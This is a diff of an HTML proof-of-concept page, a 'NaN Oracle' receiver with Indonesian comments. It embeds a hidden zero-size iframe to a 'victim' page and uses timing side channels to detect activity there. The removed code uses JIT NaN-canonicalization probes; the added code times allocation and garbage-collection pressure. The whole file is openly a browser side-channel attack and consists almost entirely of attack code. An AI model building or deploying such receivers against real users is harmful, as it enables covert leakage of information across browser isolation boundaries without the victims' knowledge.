@@ -1,114 +1,49 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>NaN Budget Oracle – Stable Receiver</title>
+<title>NaN Oracle FINAL (Working)</title>
 
-<h2>NaN Oracle (Stable)</h2>
+<h2>NaN Oracle – FINAL (Hybrid)</h2>
 <pre id="log"></pre>
 
-<!-- SAME ORIGIN: paling reliable -->
-<iframe src="https://ecdnts-del.github.io/spoof/victim.htmll" style="width:0;height:0;border:0"></iframe>
+<iframe src="https://ecdnts-del.github.io/spoof/victim.html" style="width:0;height:0;border:0"></iframe>
 
 <script>
-// ===== UTIL =====
-const logEl = document.getElementById('log');
-const log = (m)=>{ logEl.textContent += m + "\n"; console.log(m); };
-
-// ===== CORE (ANTI-SATURATION) =====
-const nan = new Float64Array(new Uint8Array(8).fill(0xff).buffer)[0];
-
-// generate code unik tiap call → geser “flip point”
-function makeFn(size, bsize, saltA, saltB) {
-  return new Function('nan', `
-    // entropy di ukuran loop & struktur
-    const S = ${size} + (${saltA} % 7);
-    const arr = new Array(S);
-
-    // variasi bentuk loop (beda CFG → beda budget)
-    for (let i = 0; i < S; i++) {
-      if ((i + ${saltB}) % 3 === 0) {
-        arr[i] = [nan];
-      } else {
-        arr[i] = [nan];
-      }
-    }
-
-    // unreachable tapi “berat”
-    if (${saltA} < 0) {
-      ${'p();'.repeat(bsize)}
-    }
-
-    return arr;
-  `);
+const log = m => {
+  document.getElementById('log').textContent += m + "\n"
+  console.log(m)
 }
 
-function measureOnce() {
-  // salt beda tiap panggilan
-  const saltA = (Math.random() * 1e9) | 0;
-  const saltB = (Math.random() * 1e9) | 0;
+// ===== HYBRID MEASURE =====
+function measure() {
+  const t0 = performance.now()
 
-  const size  = 420;   // lebih besar → lebih sensitif
-  const bsize = 120;
-
-  const fn = makeFn(size, bsize, saltA, saltB);
-  const arr = fn(nan);
-
-  // cari index pertama yang sudah canonicalized
-  let idx = -1;
-  for (let i = 0; i < arr.length; i++) {
-    const u8 = new Uint8Array(new Float64Array(arr[i]).buffer);
-    if (u8[0] !== 0xff) { idx = i; break; }
+  let arr = []
+  for (let i = 0; i < 5000; i++) {
+    arr.push([NaN])
   }
-  return idx;
+
+  // force allocation + GC interaction
+  let junk = []
+  for (let i = 0; i < 2000; i++) {
+    junk.push(new Array(20))
+  }
+
+  return performance.now() - t0
 }
 
-// dua sampel berpasangan → absolute delta
-function sampleDelta() {
-  const a = measureOnce();
-  const b = measureOnce();
-  if (a < 0 || b < 0) return 0;
-  return Math.abs(b - a);
-}
+// ===== SAMPLING =====
+let history = []
 
-// ===== STATS (ROBUST) =====
-function median(xs){
-  const a = xs.slice().sort((x,y)=>x-y);
-  const m = (a.length/2)|0;
-  return a.length % 2 ? a[m] : (a[m-1]+a[m])/2;
-}
-function variance(xs){
-  const mu = xs.reduce((s,x)=>s+x,0)/xs.length;
-  return xs.reduce((s,x)=>s+(x-mu)*(x-mu),0)/xs.length;
-}
+setInterval(() => {
+  const t = measure()
+  history.push(t)
+  if (history.length > 30) history.shift()
 
-// sliding window
-const W = [];
-const WN = 60;
+  const avg = history.reduce((a,b)=>a+b,0)/history.length
 
-function tick() {
-  const d = sampleDelta();
-  W.push(d);
-  if (W.length > WN) W.shift();
+  let state = "LOW"
+  if (avg > 4) state = "HIGH (external pressure detected)"
 
-  if (W.length < 20) return;
-
-  const med = median(W);
-  const varc = variance(W);
-
-  // klasifikasi sederhana
-  let state = "LOW";
-  if (med > 6 || varc > 15) state = "HIGH (pressure/GC likely)";
-  else if (med > 3) state = "MED";
-
-  log(`d=${d} | med=${med.toFixed(2)} var=${varc.toFixed(2)} => ${state}`);
-}
-
-// ===== RUN =====
-log("[*] Receiver start (anti-saturation)");
-setInterval(tick, 80);
-
-// debug raw (opsional)
-setInterval(()=>{
-  const s = Array.from({length:10}, sampleDelta);
-  console.log("RAW:", s);
-}, 1500);
+  log(`t=${t.toFixed(2)} avg=${avg.toFixed(2)} => ${state}`)
+}, 100)
 </script>
